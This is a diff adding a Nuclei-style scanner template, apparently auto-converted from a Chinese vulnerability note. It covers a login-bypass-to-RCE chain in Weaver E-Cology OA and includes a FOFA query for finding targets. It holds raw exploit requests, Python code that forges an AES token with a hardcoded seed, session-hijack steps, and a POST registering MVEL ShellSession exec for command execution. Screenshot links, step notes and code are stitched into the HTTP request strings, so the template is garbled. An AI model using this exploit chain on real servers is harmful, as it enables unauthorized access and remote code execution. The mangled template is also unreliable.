@@ -1,0 +1,166 @@
+id: poc-dgq3ihvtc9ip4fhu
+info:
+  name: 泛微E-Cology 前台登录绕过导致后台rce漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dgq3ihvtc9ip4fhu'
+  tags: rce,unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dgq3ihvtc9ip4fhu
+    fofa: app="泛微-OA（e-cology）"
+http:
+- raw:
+  - "POST /dwr/call/plaincall/?callCount=1&c0-id=1&c0-scriptName=WorkflowSubwfSetUtil&c0-methodName=LoadTemplateProp&batchId=a&c0-param0=string:mobilemode&scriptSessionId=1&a=.swf HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243277170-3aaa5cbf-9164-454f-834f-14a2fd657213.png)\n取security.key进行AES加密\nimport hashlib\nimport time\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\n\ndef encrypt(data, seed_str):\n    seed = seed_str.encode('utf-8')\n    first_hash = hashlib.sha1(seed).digest()\n    key_bytes = hashlib.sha1(first_hash).digest()[:16]\n    cipher = AES.new(key_bytes, AES.MODE_ECB)\n    plaintext = data.encode('utf-8')\n    padded = pad(plaintext, AES.block_size)\n    ciphertext = cipher.encrypt(padded)\n    return ciphertext.hex().upper()\n\nif __name__ == \"__main__\":\n    data = \"1;1;\" + str(int(time.time() * 1000))\n    seed = \"4bbc40a9-7786-4b\"\n    print(encrypt(data, seed))\n![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243277355-39a1fdd8-e91f-4f28-a794-6a88c8246235.png)\n取AES加密后值\nCEF202B9A449256743022A93A4B5E494AB411D1AF909892C2CDE3B48E984DD49\n\n3、将AES值带入到mToken中"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /mobilemode/mobile/server.jsp?invoker=com.api.mobilemode.web.mobile.service.MobileEntranceAction&action=meta&appid=1&appHomepageId=1&mTokenFrom=QRCode&mToken=CEF202B9A449256743022A93A4B5E494AB411D1AF909892C2CDE3B48E984DD49&_ec_ismobile=true&timeZoneOffset=&a=.swf HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243277557-3b7630e7-c456-42c7-91f0-27bcb5c94e67.png)
+
+    在第三步获取sessionKey
+
+    4140afde-219c-482a-9964-99182b42b1ea
+
+    4、'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /weaver/ImgFileDownload/a.swf?sessionkey=4140afde-219c-482a-9964-99182b42b1ea&a=.swf HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Upgrade-Insecure-Requests: 1
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243277739-df35ebb8-5f5c-45b2-a607-abb536387828.png)
+
+    用其生成ecology_JSessionid
+
+    将ecology_JSessionid写入cookie
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243277960-870f7ca3-a864-4ac8-ba2d-28622bee925d.png)
+
+
+
+    后台RCE
+
+    调用接口生成1.swf'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
+
+    Host: {{Hostname}}
+
+    If-None-Match: "6evu6PUo/Cz"
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    If-Modified-Since: Thu, 23 Jun 2022 11:04:04 GMT
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVnIIu
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: ecology_JSessionid=aaaorS3wPu-z9gMMGpOAz; __randcode__=b7e3d245-5b6b-44ba-b06b-f4b5592d68dc
+
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="operation"
+
+
+    add
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="encryptname"
+
+
+    ttttaaa
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="encryptclass"
+
+
+    org.mvel2.sh.ShellSession
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="encryptmethod"
+
+
+    exec
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="decryptmethod"
+
+
+    exec
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="isdialog"
+
+
+    0
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3
+
+    Content-Disposition: form-data; name="x"; filename="x"
+
+
+    x
+
+    ------WebKitFormBoundaryVnIIugCdViAmEyK3--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1752243278210-e39cbbab-52be-4674-a78f-183b0d626976.png)
+
+    调用接口获取1.swf的id值'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
